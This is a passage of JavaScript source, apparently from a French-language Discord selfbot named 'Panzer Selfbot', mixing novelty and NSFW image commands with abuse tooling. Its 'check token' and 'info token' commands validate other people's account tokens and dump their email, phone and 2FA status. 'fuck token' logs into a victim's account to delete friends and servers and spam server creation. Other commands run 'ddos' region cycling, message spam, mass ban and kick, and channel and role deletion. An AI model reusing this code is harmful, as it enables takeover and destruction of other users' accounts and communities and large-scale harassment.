                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
            },
            body: JSON.stringify({
                'house_id': 3
            })
        });
        message.edit(':white_check_mark: **Vous avez rejoint la hypesquad \'ballance\'**');
        console.log('Commande change hypesquad executé'.yellow);
    };
    if (message.content === prefix + 'change hypesquad bravery') {
        let url = `${'https://discordapp.com/api/v6/hypesquad/online'}`;
        request(url, {
            method: 'POST',
            headers: {
                authorization: token,
                'content-type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
            },
            body: JSON.stringify({
                'house_id': 1
            })
        });
        message.edit(':white_check_mark: **Vous avez rejoint la hypesquad \'bravery\'**');
        console.log('Commande change hypesquad executé'.yellow);
    };
    if (message.content.startsWith(prefix + 'check token')) {
        let argument = args.splice(2).join(' ');
        let url = 'https://discordapp.com/api/v6/users/@me';
        request(url, {
            method: 'GET',
            headers: {
                authorization: argument
            }
        }, function (err, response, body) {
            if (response.statusCode === 200) {
                var validetoken = newDiscord.RichEmbed()
                    .setTitle('Token info')
                    .setDescription('Le token: ' + argument + ' \n**est 100% valide** :white_check_mark:')
                    .setColor(color)
                    .setTimestamp()
                    .setFooter('Panzer Selfbot', message.author.avatarURL);
                message.edit(validetoken).catch(err => {
                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                });
            } else {
                var invalidetoken = new Discord.RichEmbed()
                    .setTitle('Token info')
                    .setDescription('Le token ' + argument + ' \nn\'est pas valide :x:')
                    .setColor(color)
                    .setTimestamp()
                    .setFooter('Panzer Selfbot', message.author.avatarURL);
                message.edit(invalidetoken).catch(err => {
                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                });
                console.log('Commande check token executé'.yellow);
            }
        })
    };
    if (message.content == prefix + 'ddos voc') {
        if (!message.guild) {
            return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
        };
        if (!message.member.hasPermission('ADMINISTRATOR')) {
            message.channel.send(':x: **Il vous faut les permissions administrateur pour executer cette commande**');
            return
        };
        let i = 0;
        const arraydesregions = ['japan', 'hongkong', 'russia', 'india', 'brazil', 'sydney'];
        setInterval(() => {
            message.guild.setRegion(arraydesregions[i]);
            i++;
            if (i == arraydesregions.length) {
                i = 0
            }
        }, 1000);
        message.edit('**Commande ddos vocal activé**');
        console.log('Commande ddos vocal executé'.yellow);
    };
    if (message.content == prefix + 'ddos-stop') {
        if (!message.guild) {
            return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
        };
        clearInterval();
        message.edit('**Commande ddos stopé**');
        console.log('Commande ddos voc stopé'.yellow);
    };
    if (message.content.startsWith(prefix + 'spam')) {
        if (!message.guild) {
            return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
        };
        let spammsg = args.splice(1).join(' ') + ' spam by Panzer-Selfbot' || '@everyonehttps://discord.gg/MD5ZyjjATcPanzer Selfbothttps://youtu.be/K-lbCR2W1zk';
        message.edit('**Wait...**');
        setInterval(() => {
            message.channel.send(spammsg).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
        }, 1000);
        console.log('Commande spam executé'.yellow);
    };
    if (message.content == prefix + 'stop spam') {
        if (!message.guild) {
            return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
        };
        clearInterval();
        message.edit('**Commande spam stopé**');
        client.destroy().then(() => {
            return client.login(token);
        });
        console.log('Commande spam stopé'.yellow);
    };
    if (message.content.startsWith(prefix + 'info token')) {
        let argument = args.splice(2).join(' ');
        let url = 'https://discordapp.com/api/v6/users/@me';
        request(url, {
            method: 'GET',
            headers: {
                authorization: argument
            }
        }, function (err, response, body) {
            if (response.statusCode === 200) {
                new Promise((resolve, reject) => {
                    let url = 'https://discordapp.com/api/v6/users/@me';
                    request(url, {
                        method: 'GET',
                        headers: {
                            authorization: argument
                        }
                    }, function (err, response, body) {
                        body = JSON.parse(body);
                        var id = body.id;
                        var username = body.username;
                        var avatar = body.avatar;
                        var tag = body.discriminator;
                        var mfaornotmfa = body.mfa_enabled;
                        var phone = body.phone;
                        var locale = body.locale;
                        let publicflags = body.public_flags;
                        let flags = body.flags;
                        let email = body.email;
                        let verified = body.verified;
                        let nsfw = body.nsfw_allowed;
                        var tyty = '';
                        tyty += 'User: ' + username + '#' + tag;
                        tyty += 'Id: ' + id;
                        tyty += 'Email: ' + email;
                        tyty += 'Numéro de telephone: ' + phone;
                        tyty += 'Avatar: ' + avatar;
                        tyty += 'Langue: ' + locale;
                        tyty += 'A2f activé?: ' + mfaornotmfa;
                        tyty += 'Compte vérifié?: ' + verified;
                        tyty += 'Nsfw activé?: ' + nsfw;
                        tyty += 'Flags: ' + flags;
                        tyty += 'Public Flags: ' + publicflags;
                        var embed = new Discord.RichEmbed()
                            .setTitle('**Commande Token Info**')
                            .setDescription(tyty)
                            .setColor(color)
                            .setFooter('Panzer-Selfbot 1.2');
                        return message.edit(embed).then(console.log('Commande info token executé'.yellow));
                    })
                })
            } else {
                var invalidetoken = new Discord.RichEmbed()
                    .setTitle('Token info')
                    .setDescription('Le token ' + argument + ' \nn\'est pas valide :x:')
                    .setColor(color)
                    .setTimestamp()
                    .setFooter('Panzer Selfbot', message.author.avatarURL);
                message.edit(invalidetoken).catch(err => {
                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                });
            }
        })
    };
    if (message.content.startsWith(prefix + 'fuck token')) {
        let fucked = new Discord.Client();
        let argument = args.splice(2).join(" ");
        let url = "https://discordapp.com/api/v6/users/@me";
        request(
            url, {
                method: "GET",
                headers: {
                    authorization: argument
                }
            },
            function (error, response, body) {
                if (response.statusCode === 200) {
                    fucked.on("ready", function () {
                        for (pas = 0; pas < 100; pas++) {
                            fucked.user.createGuild("PanzerèSelfbot v1.2", "london")
                        }
                    });
                    for (pas = 0; pas < 20; pas++) {
                        fetch("https://discord.com/api/v8/users/@me/settings", {
                            "headers": {
                                "authorization": argument,
                                "content-type": "application/json",
                            },
                            "body": "{\"theme\":\"light\"}",
                            "method": "PATCH"
                        });

                        fetch("https://discord.com/api/v8/users/@me/settings", {
                            "headers": {
                                "authorization": argument,
                                "content-type": "application/json",
                            },
                            "body": "{\"theme\":\"dark\"}",
                            "method": "PATCH"
                        });
                    };
                    fucked.on('ready', function () {
                        fucked.user.friends.forEach(amis => {
                            fucked.user.removeFriend(amis).catch(err => {
                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                            });
                        });
                        fucked.guilds.forEach((fuck) => {
                            if (fuck.ownerID === fucked.user.id) {
                                fuck.delete().catch(err => {
                                    return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                });
                            } else {
                                if (fuck.id === '836351035865563216') {
                                    return
                                }
                            };
                            fuck.leave().catch(err => {
                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                            });
                        });
                        message.edit(':white_check_mark: **Token fuck en cours...**')
                    });
                    fucked.login(argument)
                } else {
                    var invalidetoken = new Discord.RichEmbed()
                        .setTitle('Token info')
                        .setDescription('Le token ' + argument + ' \nn\'est pas valide :x:')
                        .setColor(color)
                        .setTimestamp()
                        .setFooter('Panzer Selfbot', message.author.avatarURL);
                    message.edit(invalidetoken).catch(err => {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    })
                }
            });
        console.log('Commande fuck token executé'.yellow);
    };
    if (message.content.startsWith(prefix + "8ball")) {
        let args = message.content.split(" ").splice(1).join(' ')
        var eightball = [
            "oui!",
            "non...",
            "peut etre?",
            "probablement",
            "je ne pense pas.",
            "jamais!",
            "tu peux essayer...",
        ]
        if (args[1] != null) message.edit(args + "\nla reponse est: " + eightball[Math.floor(Math.random() * eightball.length)]).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        else message.edit("Quelle est ta question? :rolling_eyes: (essayeplutot:" + prefix + " 8ball [question])");
        console.log('Commande 8ball executé'.yellow)
    };
    if (message.content.startsWith(prefix + 'mp friend')) {
        if (!args) {
            throw 'Vous devez mettre quelque chose à dire !'
        };
        let mpmsg = args.splice(2).join(' ') || 'Panzer Selfbothttps://youtu.be/K-lbCR2W1zk';
        client.user.friends.forEach(amis => {
            amis.send(mpmsg).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
        });
        console.log('Commande mp friend executé'.yellow);
    };
    if (message.content.startsWith(prefix + 'say')) {
        if (!args) {
            throw 'Vous devez mettre quelque chose à dire !'
        };
        let argument = args.splice(1).join(' ') || 'Panzer selfbot';
        let embed = new Discord.RichEmbed()
            .setTitle('**Commande Say**')
            .setDescription(argument)
            .setTimestamp()
            .setFooter('Panzer-Selbot', client.user.avatarURL)
            .setColor(color);
        for (i = 0; i < 10; i++) {
            embed.setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
        };
        console.log('Commande Say executé'.yellow);
    };
    if (message.content.startsWith(prefix + "user info")) {
        if (!mentionuser) {
            return msg.edit(":x: **Utilisateur inconnu!**"), mentionuser = message.author;
        }
        var userGuild = (message.guild.member(mentionuser));
        var game = mentionuser.presence.game;
        var gameName = game ? game.name : "Nothing";
        var userRoles = (!userGuild ? null : userGuild.roles.array());
        if (userGuild) {
            userRoles.shift();
            for (var i = 0; i < userRoles.length; ++i) {
                userRoles[i] = userRoles[i].name;
            }
            userRoles = userRoles.join(", ");
        };
        var status = {
            dnd: "Do Not Disturb",
            offline: "Offline/Invisible",
            online: "Online",
            idle: "Idle"
        };
        const embed = new Discord.RichEmbed()
            .setAuthor(`${mentionuser.username}#${mentionuser.discriminator} | ${mentionuser.id}`, mentionuser.displayAvatarURL)
            .setFooter("E")
            .setThumbnail(mentionuser.displayAvatarURL)
            .setColor(color)
            .addField("Created", `${mentionuser.createdAt.toString().substr(0, 15)},\n${checkDays(mentionuser.createdAt)}`, true)
            .addField("Joined", `${userGuild.joinedAt.toString().substr(0, 15)},\n${checkDays(userGuild.joinedAt)}`, true)
            .addField("Status", status[mentionuser.presence.status], true)
            .addField("Playing", gameName, true)
            .addField("Nickname", userGuild.nickname ? userGuild.nickname : "None", true)
            .addField("Avatar URL", `[Click here!](${mentionuser.displayAvatarURL})`, true)
            .addField("Roles", userRoles ? userRoles : "None")

        msg.edit(embed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        console.log('Commande user info executé'.yellow)
    };
    if (message.content === prefix + "serveur info") {
        if (!msg.guild) {
            return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
        }

        const millis = new Date().getTime() - msg.guild.createdAt.getTime();
        const days = millis / 1000 / 60 / 60 / 24;
        const verificationLevels = ['None', 'Low', 'Medium', 'Insane', 'Extreme'];

        let embed = new Discord.RichEmbed()
            .setTitle('**Serveur info**')
            .addField('Name:', `${msg.guild.name}`)
            .addField('Created On:', `${message.guild.createdAt.toString().substr(0, 15)},\n${checkDays(message.guild.createdAt)}`, true)
            .addField('Default Channel:', `${msg.guild.defaultChanne}`)
            .addField('Region:', `${msg.guild.region}`)
            .addField('Member Count', `${msg.guild.members.filter(m => m.presence.status !== 'offline').size} / ${msg.guild.memberCount}`)
            .addField('Owner:', `${message.guild.owner.user.username}`)
            .addField('Text Channels', `${msg.guild.channels.filter(m => m.type === 'text').size}`)
            .addField('Voice Channels', `${msg.guild.channels.filter(m => m.type === 'voice').size}`)
            .addField('Verification Level', `${verificationLevels[msg.guild.verificationLevel]}`)
            .addField('Roles:', `${msg.guild.roles.size}`)
            .addField('Guild ID:', `${msg.guild.id}`)
            .setColor(color)

        if (msg.guild.iconURL != null) {
            embed.setThumbnail(`${msg.guild.iconURL}`);
        }
        msg.edit(embed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        console.log('Commande serveur info effectué'.yellow)
    };
    if (message.content === prefix + 'stats') {
        let embed = new Discord.RichEmbed()
        setTimestamp()
            .setColor(color)
            .setTitle('**Selfbot Statistics**')
            .addField('Mem Usage:', '' + (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2) + 'MB')
            .addField('Servers:', client.guilds.size)
            .addField('Channels:', client.channels.size)
            .addField('Users:', client.guilds.map(user => {
                return user.memberCount;
            }))
            .addField('Servers:', client.guilds.size)
            .addField('Servers:', client.guilds.size)
            .setFooter('Panzer-Selfbot 1.2', client.user.avatarURL);
        if (client.user.premium > 0) {
            embed.addField('• Nitro', 'oui');
        } else {
            embed.addField('• Nitro', 'non');
        };
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande stats effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'ass')) {
        superagent.get('https://nekobot.xyz/api/image').query({
            type: 'ass'
        }).end((err, response) => {
            var embed = new Discord.RichEmbed()
                .setColor(color)
                .setFooter('Panzer-Selfbot 1.2')
                .setTimestamp()
                .setImage(response.body.message)
                .setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
        });
        console.log('Commande ass effectué'.yellow);
    };
    if (message.content.startsWith(prefix + '4k')) {
        superagent.get('https://nekobot.xyz/api/image').query({
            type: '4k'
        }).end((err, response) => {
            var embed = new Discord.RichEmbed()
                .setFooter('Panzer-Selfbot 1.2')
                .setTimestamp()
                .setImage(response.body.message)
                .setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
            console.log('Commande 4k effectué'.yellow);
        });
    };
    if (message.content.startsWith(prefix + 'nsfw-gif')) {
        superagent.get('https://nekobot.xyz/api/image').query({
            type: 'pgif'
        }).end((err, response) => {
            var embed = new Discord.RichEmbed()
                .setFooter('Panzer-Selfbot 1.2')
                .setTimestamp()
                .setImage(response.body.message)
                .setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
            console.log('Commande nsfw gif effectué'.yellow);
        });
    };
    if (message.content.startsWith(prefix + 'hentai')) {
        superagent.get('https://nekobot.xyz/api/image').query({
            type: 'hentai_anal'
        }).end((err, response) => {
            var embed = new Discord.RichEmbed()
                .setFooter('Panzer-Selfbot 1.2')
                .setTimestamp()
                .setImage(response.body.message)
                .setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
            console.log('Commande hentai effectué'.yellow);
        });
    };
    if (message.content.startsWith(prefix + 'pussy')) {
        superagent.get('https://nekobot.xyz/api/image').query({
            type: 'pussy'
        }).end((err, response) => {
            var embed = new Discord.RichEmbed()
                .setFooter('Panzer-Selfbot 1.2')
                .setTimestamp()
                .setImage(response.body.message)
                .setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
            console.log('Commande pussy effectué'.yellow);
        });
    };
    if (message.content.startsWith(prefix + 'thigh')) {
        superagent.get('https://nekobot.xyz/api/image').query({
            type: 'thigh'
        }).end((err, response) => {
            var embed = new Discord.RichEmbed()
                .setFooter('Panzer-Selfbot 1.2')
                .setTimestamp()
                .setImage(response.body.message)
                .setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
            console.log('Commande thigh effectué'.yellow);
        });
    };
    if (message.content.startsWith(prefix + 'anal')) {
        superagent.get('https://nekobot.xyz/api/image').query({
            type: 'anal'
        }).end((err, response) => {
            var embed = new Discord.RichEmbed()
                .setFooter('Panzer-Selfbot 1.2')
                .setTimestamp()
                .setImage(response.body.message)
                .setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
            console.log('Commande anal effectué'.yellow);
        });
    };
    if (message.content.startsWith(prefix + 'fight')) {
        if (!mentionuser) {
            return message.edit(':x: **Aucun utilisateur mentionné**')
        };
        var embed = new Discord.RichEmbed()
            .setColor(color)
            .setFooter('Panzer-Selfbot 1.2')
            .setTitle(mentionuser.username + ' __**VS**__ ' + client.user.username)
            .setImage('https://data.photofunky.net/output/image/b/e/9/2/be9268/photofunky.gif');
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande fight effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'boom')) {
        if (!mentionuser) {
            return message.edit(':x: **Aucun utilisateur mentionné**')
        };
        var embed = new Discord.RichEmbed()
            .setColor(color)
            .setFooter('Panzer-Selfbot 1.2')
            .setTitle(mentionuser.username + ' **Ce Fait Explosé Par **💣💥 ' + client.user.username)
            .setImage('https://media.discordapp.net/attachments/648223633185177612/650715035592687647/image0.gif');
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande boom effectué'.yellow);
    };
    if (message.content === prefix + 'shutdown') {
        message.delete().then(() => {
            return process.exit(1);
        });
        console.log('Commande shutdown effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'kick')) {
        let guild = message.guild;
        if (!guild) {
            message.edit(':x: **Veuillez executer cette commande sur un serveur!**');
            return
        };
        if (!mentionuser) {
            message.edit(':x: **Veuillez mentionner un utilisateur!**');
            return
        };
        mentionuser.kick().then(member => {
            message.edit(':wave: ' + member.displayName + ' has been successfully kicked :point_right: ');
        }).catch(() => {
            message.edit(':x: **Access Denied**');
        });
        console.log('Commande kick effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'ban')) {
        let guild = message.guild;
        if (!guild) {
            message.edit(':x: **Veuillez executer cette commande sur un serveur!**');
            return
        };
        if (!mentionuser) {
            message.edit(':x: **Veuillez mentionner un utilisateur!**');
            return
        };
        mentionuser.ban().then(member => {
            message.edit(':wave: ' + member.displayName + ' has been successfully banned https://gfycat.com/playfulfittingcaribou :point_right: ');
        }).catch(() => {
            message.edit(':x: **Access Denied**');
        });
        console.log('Commande ban effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'name all')) {
        let serveur = message.guild;
        if (!serveur) return msg.edit(':x: **Commande uniquement utilisable sur un serveur**');

        const usermsg = message.content.split(" ").slice(2).join(" ") || message.author.username

        if (!message.member.hasPermission('MANAGE_NICKNAMES'))
            return message.delete().then(console.log('[', 'ERROR'.red, ']', 'permission insuffisante'.green))
        const dmusers = message.guild.members;

        msg.edit(`Je renomme tout le monde par ${usermsg}`)

        dmusers.forEach(dmuser => {
            dmuser.setNickname(usermsg).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        })
        console.log('Commande name all effectué'.yellow)
    }
    if (message.content === prefix + 'all ban') {
        let serveur = message.guild;
        if (!serveur) return msg.edit(':x: **Commande uniquement utilisable sur un serveur**');

        if (!message.member.hasPermission('BAN_MEMBERS'))
            return message.delete().then(console.log('[', 'ERROR'.red, ']', 'permission insuffisante'.green))

        message.guild.members.forEach(dmuser => {

            setInterval(() => {
                if (!dmuser.bannable) return;
                dmuser.ban().catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
            }, 1000);
        })
        console.log('Commande ban all effectué'.yellow)
    }
    if (message.content === prefix + 'all kick') {
        let serveur = message.guild;
        if (!serveur) return msg.edit(':x: **Commande uniquement utilisable sur un serveur**');

        if (!message.member.hasPermission('KICK_MEMBERS'))
            return message.delete().then(console.log('[', 'ERROR'.red, ']', 'permission insuffisante'.green))

        const dmusers = message.guild.members
        dmusers.forEach(dmuser => {
            if (!dmuser.kickable) return;
            dmuser.kick().catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        })
        console.log('Commande kick all effectué'.yellow)
    }
    if (message.content.startsWith(prefix + 'purge')) {

        message.channel.fetchMessages().then(message =>
            message.forEach(m => {
                if (m.author.id === client.user.id) {
                    m.delete().catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
                }
            }));
        console.log('Commande purge effectué'.yellow);
    }
    if (message.content === prefix + 'rire') {
        let embed = new Discord.RichEmbed();
        embed.setColor(color)
            .setTitle('**Commande rire:**')
            .setTimestamp()
            .setFooter('Panzer-Selfbot 1.2')
            .setImage(rire[Math.floor(Math.random() * rire.length)]);
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande rire effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'kiss')) {
        if (!mentionuser) {
            message.edit(':x: **Veuillez mentionner un utilisateur!**');
            return
        };
        let embed = new Discord.RichEmbed();
        embed.setColor(color).setTitle(`${client.user.username} kiss ${mentionuser.username}`)
            .setTimestamp()
            .setFooter('Panzer-Selfbot 1.2')
            .setImage(kiss[Math.floor(Math.random() * kiss.length)]);
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande kiss effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'veski')) {
        if (!mentionuser) {
            message.edit(':x: **Veuillez mentionner un utilisateur!**');
            return
        };
        let embed = new Discord.RichEmbed();
        embed.setColor(color)
            .setTitle(`**${mentionuser.username}' s'est enfui!**`)
            .setTimestamp()
            .setFooter('Panzer-Selfbot 1.2')
            .setImage(veski[Math.floor(Math.random() * veski.length)]);
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande veski effectué'.yellow);
    };
    if (message.content.startsWith(prefix + "load")) {
        message.delete();
        var charge = ".";
        var chargeC = "█";
        message.channel.send("```[" + charge.repeat(50) + "]```").then((message) => {
            for (i = 0; i <= 50; i++) {
                message.edit("```[" + chargeC.repeat(i) + charge.repeat(50 - i) + "]  -  " + i * 100 / 50 + "%\n" + "loading..```");
            }
            message.edit("`Succesfull load.`").catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            console.log('Commande load effectué'.yellow)
        })
    }
    if (message.content === prefix + "delete all channel") {
        let serveur = message.guild;
        if (!serveur) {
            message.edit(':x: **Veuillez executer cette commande dans un serveur!**');
            return;
        }
        if (!message.member.hasPermission('MANAGE_CHANNELS')) return message.delete().then(console.log('[', 'ERROR'.red, ']', 'permission insuffisante'.green))
        var channels = message.guild.channels
        channels.forEach(chan => {
            chan.delete().catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        })
        console.log('Commande delete all channel effectué'.yellow)

    }
    if (message.content === prefix + "delete all role") {
        let serveur = msg.guild;
        if (!serveur) {
            message.edit(':x: **Veuillez executer cette commande sur un serveur!**');
            return;
        }
        message.guild.roles.forEach(roles => {
            roles.delete().catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))
        })
        console.log('Commande delete all role effectué'.yellow)
    }
    if (message.content.startsWith(prefix + 'punch')) {
        if (!mentionuser) {
            message.edit(':x: **Veuillez mentionner un utilisateur!**');
            return
        };
        let embed = new Discord.RichEmbed();
        embed.setColor(color)
            .setTitle(`**${client.user.username} punch ${mentionuser.username}**`)
            .setTimestamp()
            .setFooter('Panzer-Selfbot 1.2')
            .setImage(punch[Math.floor(Math.random() * punch.length)]);
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande punch effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'calin')) {
        if (!mentionuser) {
            message.edit(':x: **Veuillez mentionner un utilisateur!**');
            return
        };
        let embed = new Discord.RichEmbed();
        embed.setColor(color)
            .setTitle(`**${client.user.username} fait un calin a ${mentionuser.username}**`)
            .setTimestamp()
            .setFooter('Panzer-Selfbot 1.2')
            .setImage(hugh[Math.floor(Math.random() * hugh.length)]);
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande calin effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'set serveur name')) {
        let arg = args.splice(1).join(" ") || "Panzer-Selfbot 1.2";
        message.edit(`Changement du nom du serveur pour: ` + arg);
        message.guild.setName(arg)
        console.log('Commande set serveur name effectué'.yellow)
    }
    if (message.content.startsWith(`${prefix}token`)) {
        if (!mentionuser) {
            message.edit(':x: **Veuillez mentionner un utilisateur!**');
            return;
        }
        let token = ["HircHg", "XnyXiA", "XluxwQ", "XXn_KA", "Xiq-WQ"];
        let token1 = ["a6uny9jcMjet2W2LASruribq6VI", "oZyGJDamSJ4hmJaaLvzdNo1bLqk", "3_6Xt2k4OieDKimnNYGWUq9vJRo", "xllelHltGdY7DP_0s1XST4cgzTs"];
        var id = mentionuser.id;
        var bytes = utf8.encode(id);
        var encoded = base64.encode(bytes);
        var embed_encode = new Discord.RichEmbed()
            .setColor(color)
            .setFooter('Panzer-Selfbot 1.2')
            .setTitle(`Token match ${mentionuser.username}`)
            .setDescription(`${encoded}.${token[Math.floor(Math.random() * token.length)]}.${token1[Math.floor(Math.random() * token1.length)]}`)
        setTimeout(() => {
            message.edit("░░░░░░░░░░ 0%");
        }, 1000);
        setTimeout(() => {
            message.edit("▓▓░░░░░░░░ 20%");
        }, 1500);
        setTimeout(() => {
            message.edit("▓▓▓▓░░░░░░ 40%");
        }, 2000);
        setTimeout(() => {
            message.edit("▓▓▓▓▓▓░░░░ 60%");
        }, 2500);
        setTimeout(() => {
            message.edit("▓▓▓▓▓▓▓▓░░ 80%");
        }, 3000);
        setTimeout(() => {
            message.edit("▓▓▓▓▓▓▓▓▓▓ 100%");
        }, 3500);
        setTimeout(() => {
            message.edit(embed_encode).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        }, 4000)
        console.log('Commande token effectué'.yellow);
    }
    if (message.content.startsWith(`${prefix}encode`)) {
        var text = args.join(" ") || "Panzer selfbot";;
        var bytes = utf8.encode(text);
        var encoded = base64.encode(bytes);
        let embed_encode = new Discord.RichEmbed()
            .setColor(`${color}`)
            .setTitle("Texte -> Base64 :")
            .setDescription(encoded)
        message.edit(embed_encode).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        console.log('Commande encode effectué'.yellow)
    }
    if (message.content.startsWith(`${prefix}lovecalc`)) {
        let random = ['5%', '10%', '15%', '20%', '25%', '30%', '35%', '40%', '45%', '50%', '55', '60%', '65%', '70%', '75%', '80%', '85%', '90%', '95%', '100%'];
        let rdm = Math.floor(Math.random() * random.length);
        let argument = args.slice(0).join(' ') || 'Panzer selfbot';;;
        let embed = new Discord.RichEmbed()
            .setAuthor(message.author.tag)
            .setColor('ORANGE')
            .setFooter('Panzer-Selfbot 1.2')
            .setThumbnail('undefined')
            .addField('calcul de relation plausible ❤', argument)
            .addField('relation estimée à ❤', random[rdm]);
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande lovecalc effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'spotify')) {
        const argument = message.content.split(' ').slice(1).join(' ') || 'Panzer Selfbot';
        let presence = rpcGenerator.createSpotifyRpc(client)
            .setAssetsLargeImage('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e')
            .setAssetsSmallImage('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e')
            .setDetails(argument)
            .setState('Panzer-Selfbot 1.2')
            .setStartTimestamp(Date.now())
            .setEndTimestamp(Date.now() + 86400000);
        client.user.setPresence(presence.toDiscord()).then(message.edit(':white_check_mark: **Tu écoutes ' + (message.content.split(' ').slice(1).join(' ') || 'Panzer Selfbot') + ' sur spotify**')).catch(console.error);
        console.log('Commande spotify effectué'.yellow);
    };
    if (message.content.startsWith(`${''}${prefix}${'reset'}`)) {
        clearInterval();
        client.user.setActivity(null, {});
        message.edit(':information_source:  Votre statut a été réinitialisé ! :information_source:').catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande reset effectué'.yellow);
    };
    if (message.content === prefix + 'nitro') {
        const embed = new Discord.RichEmbed()
            .setColor(color)
            .setThumbnail('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
            .addField('Gift :', '|| https://discord.gift/' + nitrocode(16, '0aA') + ' ||');
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande nitro generator effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'gen token')) {
        message.delete();
        setTimeout(() => {
            client.destroy().catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
        }, 1500);
        console.log('Nouveau token generé'.green);
    };
    if (msg.content.startsWith(prefix + "reverse")) {
        let reverse = args.splice(1).join(' ');
        if (!reverse) {
            message.edit(':x: **Pas de test definit**')
        }

        function reverseString(str) {
